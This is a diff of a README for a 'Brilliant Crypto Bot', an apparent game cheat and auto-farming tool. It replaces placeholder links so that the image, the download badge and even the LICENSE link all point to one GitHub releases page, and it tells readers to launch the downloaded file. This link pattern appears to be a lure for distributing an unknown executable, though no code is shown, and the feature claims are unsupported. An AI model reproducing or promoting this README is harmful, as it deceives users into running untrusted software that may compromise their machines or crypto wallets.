@@ -3,7 +3,7 @@
 ## Overview
 Welcome to the home of the Brilliant Crypto Bot, your ultimate tool for automating farming and clicker activities in the popular Brilliant Crypto game. This bot is packed with features designed to enhance your gameplay experience, optimize your profits, and give you an edge over other players.
 
-![Brilliant Crypto Bot](https://your-image-url/here.png)
+![Brilliant Crypto Bot](https://github.com/muhamadfakhrie/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
 
 ## Key Features
 - **Auto-clicker:** Say goodbye to repetitive clicking tasks. The bot will automatically handle all clicking activities for you.
@@ -36,7 +36,7 @@ This repository covers a wide range of topics related to the Brilliant Crypto Bo
 - mini-game
 
 ## Installation
-To get started with the Brilliant Crypto Bot, simply download the latest release from the following link: [![Download Bot](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+To get started with the Brilliant Crypto Bot, simply download the latest release from the following link: [![Download Bot](https://github.com/muhamadfakhrie/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)](https://github.com/muhamadfakhrie/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
 
 Make sure to launch the file after downloading and follow the setup instructions to start using the bot effectively.
 
@@ -50,7 +50,7 @@ We welcome contributions from the community to help improve and enhance the Bril
 If you encounter any issues or have any questions about the Brilliant Crypto Bot, please don't hesitate to reach out to our support team. We're here to help you make the most of your gaming experience.
 
 ## License
-The Brilliant Crypto Bot is licensed under the MIT License. See the [LICENSE](https://github.com/your-repo/LICENSE) file for more details.
+The Brilliant Crypto Bot is licensed under the MIT License. See the [LICENSE](https://github.com/muhamadfakhrie/Brilliant-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases) file for more details.
 
 ---
 
